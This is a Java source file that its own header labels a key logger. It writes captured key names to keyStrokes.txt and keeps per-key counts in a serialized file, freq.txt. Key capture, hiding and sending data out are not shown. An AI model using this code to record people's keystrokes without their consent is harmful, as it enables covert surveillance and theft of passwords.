package utility;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

import javax.swing.JOptionPane;

/**
 * @author avAnkyAnkit last modified @18-Mar-2018 @12:53:08 AM Key Logger - TODO
 */

public class FileReadWrite {
	private String freq, keyStrokes;
	private HashMap<String, Integer> keyMap;

	public FileReadWrite(String path) {

		boolean present = false;
		File dir = new File(path);
		keyStrokes = dir.getAbsolutePath() + "//keyStrokes.txt";
		freq = dir.getAbsolutePath() + "//freq.txt";

		for (File f : dir.listFiles()) {
			if (f.getName().equals("freq.txt")) {
				present = true;
			}
		}

		if (!present) {
			keyMap = new HashMap<>();
			try {
				ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(freq));
				obj.writeObject(keyMap);
				obj.close();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public void add(String s) {
		try {
			ObjectInputStream inp = new ObjectInputStream(new FileInputStream(freq));
			HashMap<String, Integer> keys = (HashMap<String, Integer>) inp.readObject();
			if (keys.containsKey(s))
				keys.put(s, keys.get(s) + 1);
			else
				keys.put(s, 1);
			ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(freq));
			out.writeObject(keys);
			out.close();
			inp.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		addTofile(s);
	}

	/**
	 * @param key
	 */
	public void addTofile(String key) {
		try {
			FileWriter fileWriter = new FileWriter(keyStrokes, true);
			BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

			if (key.equals("Space"))
				bufferedWriter.write(" ");
			else if (key.equals("Enter"))
				bufferedWriter.newLine();
			else
				bufferedWriter.write(key);

			bufferedWriter.close();
		} catch (Exception e) {
			JOptionPane.showMessageDialog(null, "unable to capture this key");
		}
	}

	public int get(String s) {
		HashMap<String, Integer> keys;
		try {
			ObjectInputStream inp = new ObjectInputStream(new FileInputStream(freq));
			keys = (HashMap<String, Integer>) inp.readObject();
			if (keys.containsKey(s))
				return keys.get(s);
			inp.close();
		} catch (Exception e) {

		}
		return 0;
	}
}
